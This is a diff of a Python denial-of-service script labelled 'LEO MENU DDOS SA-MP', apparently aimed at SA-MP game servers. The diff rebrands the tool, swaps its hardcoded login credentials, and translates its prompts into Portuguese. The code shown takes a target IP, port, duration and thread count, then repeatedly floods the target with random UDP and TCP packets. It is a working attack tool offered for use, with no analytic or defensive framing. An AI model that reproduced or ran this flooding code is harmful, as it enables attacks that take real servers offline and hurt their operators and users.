@@ -22,8 +22,8 @@ while attemps < 100:
     username = input('Enter your username: ')
     password = input('Enter your password: ')
 
-    if username == 'NUDOS' and password == 'NUDOS':
-        print('You have successfully logged in Welcome to NUDOS!!')
+    if username == 'LEO' and password == 'MODZ':
+        print('LOGADO COM SUCESSO BEM VINDO DEVOLTA LEO MODZ!!')
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -36,14 +36,14 @@ print("""
 	  LEO MENU DDOS SA-MP: BY LEO MODZ
 	╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
 	╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
-	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5
+	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V1.0
 """)
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
+ip = str(input(" IP DO SERVER :"))
+port = int(input(" PORTA DO SERVER :"))
 choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
+times = int(input(" TEMPO :"))
+threads = int(input(" Tópicos :"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -53,7 +53,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"Attack Sent!!!")
+			print(i +"Ataque enviado!!!")
 		except:
 			print("[!] Error!!!")
 
@@ -67,7 +67,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i +"Ataque Enviado!!!")
 		except:
 			s.close()
 			print("[*] Error!!!")
@@ -83,7 +83,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i +"Ataque enviado!!!")
 		except:
 			s.close()
 			print("[*] Error!!!")
@@ -99,7 +99,7 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i +"Ataque enviado!!!")
 		except:
 			s.close()
 			print("[*] Error!!!")
